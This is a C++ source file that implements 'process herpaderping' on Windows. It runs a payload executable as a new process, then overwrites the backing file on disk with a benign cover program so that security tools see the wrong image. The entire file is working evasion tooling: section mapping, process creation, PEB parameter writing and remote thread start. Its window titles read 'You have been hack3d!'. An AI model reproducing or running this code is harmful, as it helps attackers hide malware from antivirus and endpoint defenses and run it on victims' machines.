#include "Herpaderping.h"

#include <iostream>

constexpr auto PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;
constexpr auto TARGET_PROCESS_TITLE = L"You have been hack3d!";

Herpaderping::Herpaderping(std::wstring path_to_source, 
						   std::wstring path_to_target, 
						   std::wstring path_to_cover,
						   const wchar_t* windows_station_to_run_on) :
	m_windows_station_to_run_on(windows_station_to_run_on),
	m_section_handle(std::make_unique<HandleGuard>()),
	m_target_process(std::make_unique<HandleGuard>()),
	m_target_file(std::make_unique<HandleGuard>()),
	m_thread_handle(std::make_unique<HandleGuard>()),
	m_source_file_payload(),
	m_ntdll_functions(std::make_unique<NtdllFunctions>()),
	m_path_to_source(path_to_source),
	m_path_to_target(path_to_target),
	m_path_to_cover(path_to_cover)
{ }

void Herpaderping::run_process_with_cover()
{
	read_source_payload();

	create_target_file_and_write_payload();
	
	create_target_process();
	
	cover_target_file();

	create_and_run_target_main_thread();
}

void Herpaderping::read_source_payload()
{
	HANDLE source_file = CreateFileW(this->m_path_to_source.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	if (INVALID_HANDLE_VALUE == source_file) {
		throw std::runtime_error("CreateFileA: failed to open source file. Error: " + error_to_str(GetLastError()));
	}

	DWORD source_file_size = GetFileSize(source_file, nullptr);
	if (INVALID_FILE_SIZE == source_file_size) {
		throw std::runtime_error("GetFileSize: failed to retreive source file size. Error: " + error_to_str(GetLastError()));
	}

	this->m_source_file_payload = std::make_unique<std::vector<char>>(source_file_size);
	if (!ReadFile(source_file, m_source_file_payload.get()->data(), source_file_size, nullptr, nullptr)) {
		throw std::runtime_error("ReadFile: failed to read source file. Error: " + error_to_str(GetLastError()));
	}
}

void Herpaderping::create_target_file_and_write_payload()
{
	HANDLE tmp_target_file = nullptr;
	tmp_target_file = CreateFileW(m_path_to_target.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		0,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	if (INVALID_HANDLE_VALUE == tmp_target_file) {
		throw std::runtime_error("CreateFileA: failed to create target file. Error: " + error_to_str(GetLastError()));
	}

	// Handle is valid, set the guard in accordance.
	m_target_file->set(tmp_target_file);

	if (!WriteFile(m_target_file->get(),
		m_source_file_payload.get()->data(),
		m_source_file_payload.get()->size(),
		nullptr,
		nullptr)) {
		throw std::runtime_error("WriteFile: failed to write source file to target file. Error: " + error_to_str(GetLastError()));
	}
}

void Herpaderping::create_target_process()
{
	// Create a section with this->target_file as its image.
	HANDLE tmp_section_handle = nullptr;
	NTSTATUS create_section_return_value = m_ntdll_functions->NtCreateSection(&tmp_section_handle,
		SECTION_ALL_ACCESS,
		nullptr,
		nullptr,
		PAGE_READONLY,
		SEC_IMAGE,
		m_target_file->get());
	if (create_section_return_value) {
		throw std::runtime_error("NtCreateSection: failed to create section. Error: " + error_to_str(create_section_return_value));
	}

	m_section_handle->set(tmp_section_handle);

	// Create a process with the section created above.
	// TODO: return value?
	HANDLE tmp_process_handle = nullptr;
	m_ntdll_functions->NtCreateProcessEx(&tmp_process_handle,
		PROCESS_ALL_ACCESS,
		nullptr,
		GetCurrentProcess(),
		PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
		m_section_handle->get(),
		nullptr,
		nullptr,
		FALSE);

	m_target_process->set(tmp_process_handle);
}

void Herpaderping::cover_target_file()
{
	// Open and read target executable file.
	HANDLE cover_file_handle = CreateFileW(this->m_path_to_cover.c_str(),
		GENERIC_READ,
		0,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	if (INVALID_HANDLE_VALUE == cover_file_handle) {
		throw std::runtime_error("CreateFileA: failed to open cover file. Error: " + error_to_str(GetLastError()));
	}

	auto cover_file_size = GetFileSize(cover_file_handle, nullptr);
	if (INVALID_FILE_SIZE == cover_file_size) {
		throw std::runtime_error("GetFileSize: failed to get cover file size. Error: " + error_to_str(GetLastError()));
	}

	auto cover_file_content = std::make_unique<std::vector<char>>(cover_file_size);
	if (!ReadFile(cover_file_handle, cover_file_content.get()->data(), cover_file_size, nullptr, nullptr)) {
		throw std::runtime_error("ReadFile: failed to read cover file. Error: " + error_to_str(GetLastError()));
	}

	// Seek to the beginning of the target executable.
	if (INVALID_SET_FILE_POINTER == SetFilePointer(m_target_file->get(), 0, nullptr, FILE_BEGIN)) {
		throw std::runtime_error("SetFilePointer: failed to set target file pointer. Error: " + error_to_str(GetLastError()));
	}

	// Overwrite the target executable with the content of the cover executable.
	if (!WriteFile(m_target_file->get(), cover_file_content.get()->data(), cover_file_size, nullptr, nullptr)) {
		throw std::runtime_error("WriteFile: failed to overwrite target file. Error: " + error_to_str(GetLastError()));
	}
}

void Herpaderping::create_and_run_target_main_thread()
{
	PRTL_USER_PROCESS_PARAMETERS process_parameters = nullptr;
	UNICODE_STRING image_path_name;
	UNICODE_STRING command_line;
	UNICODE_STRING title;
	UNICODE_STRING desktop_info;
	PROCESS_BASIC_INFORMATION current_process_pbi;
	PEB64 current_process_peb;
	
	// TODO: return value?
	m_ntdll_functions->NtQueryInformationProcess(GetCurrentProcess(), 
		ProcessBasicInformation, 
		&current_process_pbi,
		sizeof(current_process_pbi), 
		nullptr);

	current_process_peb = *reinterpret_cast<PEB64*>(current_process_pbi.PebBaseAddress);

	// Initialize relevant parameters.
	m_ntdll_functions->RtlInitUnicodeString(&image_path_name, m_path_to_target.c_str());
	m_ntdll_functions->RtlInitUnicodeString(&command_line, std::wstring(L"\"" + m_path_to_target + L"\"").c_str());
	m_ntdll_functions->RtlInitUnicodeString(&title, L"HACK3D!");
	m_ntdll_functions->RtlInitUnicodeString(&desktop_info, m_windows_station_to_run_on.c_str());

	m_ntdll_functions->RtlCreateProcessParametersEx(&process_parameters,
		&image_path_name,
		nullptr,
		nullptr,
		&command_line,
		reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS>(current_process_peb.ProcessParameters)->Environment,
		&title,
		&desktop_info,
		nullptr,
		nullptr,
		0);

	PROCESS_BASIC_INFORMATION pbi;
	m_ntdll_functions->NtQueryInformationProcess(m_target_process->get(),
		ProcessBasicInformation, 
		&pbi, 
		sizeof(pbi), 
		nullptr);

	// Allocate space for the parameters in our created process.
	auto process_allocated_space = VirtualAllocEx(m_target_process->get(),
		nullptr,
		process_parameters->MaximumLength + process_parameters->EnvironmentSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	if (NULL == process_allocated_space) {
		throw std::runtime_error("VirtualAllocEx: failed to allocate memory in target process. Error: " + error_to_str(GetLastError()));
	}

	process_parameters->Environment = reinterpret_cast<PBYTE>(process_allocated_space) + process_parameters->Length;

	// Write process parameters to the process.
	if (!WriteProcessMemory(m_target_process->get(),
		process_allocated_space,
		process_parameters,
		process_parameters->MaximumLength + process_parameters->EnvironmentSize,
		nullptr)) {
		throw std::runtime_error("WriteProcessMemory: failed to write parameters to target process. Error: " + error_to_str(GetLastError()));
	}

	// Update the ProcessParameters in the process PEB to point to our parameters.
	if (!WriteProcessMemory(m_target_process->get(),
		reinterpret_cast<unsigned char*>(pbi.PebBaseAddress) + offsetof(PEB64, ProcessParameters),
		&process_allocated_space,
		sizeof(process_allocated_space),
		nullptr)) {
		throw std::runtime_error("WriteProcessMemory: failed to update target process's PEB. Error: " + error_to_str(GetLastError()));
	}

	const PIMAGE_DOS_HEADER payload_dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(this->m_source_file_payload.get()->data());
	const PIMAGE_NT_HEADERS64 payload_nt_header = reinterpret_cast<PIMAGE_NT_HEADERS64>(this->m_source_file_payload.get()->data() + payload_dos_header->e_lfanew);

	// Read createed process memory to find base address.
	PEB64 process_peb;
	if (!ReadProcessMemory(m_target_process->get(),
		pbi.PebBaseAddress,
		&process_peb,
		sizeof(process_peb),
		nullptr)) {
		throw std::runtime_error("ReadProcessMemory: failed to read process memory. Error: " + error_to_str(GetLastError()));
	}

	// Calculate the absolute address of the entry point.
	ULONGLONG entry_point = process_peb.ImageBaseAddress + payload_nt_header->OptionalHeader.AddressOfEntryPoint;

	HANDLE tmp_thread_handle = nullptr;
	m_ntdll_functions->NtCreateThreadEx(&tmp_thread_handle,
		THREAD_ALL_ACCESS,
		nullptr,
		m_target_process->get(),
		reinterpret_cast<PVOID>(entry_point),
		nullptr,
		0, 0, 0, 0,
		nullptr);
	if (NULL == tmp_thread_handle) {
		throw std::runtime_error("NtCreateThreadEx: failed to create target process' main thread. Error: " + error_to_str(GetLastError()));
	}

	m_thread_handle->set(tmp_thread_handle);
}
 